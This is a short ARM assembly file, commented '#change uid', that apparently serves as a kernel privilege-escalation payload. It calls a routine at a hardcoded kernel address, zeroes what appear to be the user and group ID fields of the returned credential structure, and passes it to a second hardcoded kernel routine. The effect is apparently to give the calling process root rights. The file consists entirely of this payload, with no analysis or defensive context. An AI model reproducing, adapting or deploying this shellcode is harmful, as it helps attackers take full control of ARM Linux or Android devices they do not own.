#	gcc -c hello.s
#	ld hello.o -o hello
#

.section .bss
.section .rodata
.section .text
.globl _start
_start:
#change uid
	push {lr, r0, r1, r4}
	mov r0, #0
	ldr r4, =0x8003f44c
	blx r4

	mov r4, r0
	sub r1, r1, r1
	add r0, #4
	str r1, [r0], #4
	str r1, [r0], #4
	str r1, [r0], #4
	str r1, [r0], #4
	str r1, [r0], #4
	str r1, [r0], #4
	str r1, [r0], #4
	mov r0, r4

	ldr r4, =0x8003f56c
	blx r4

	pop {lr, r0, r1, r4}
	bx lr

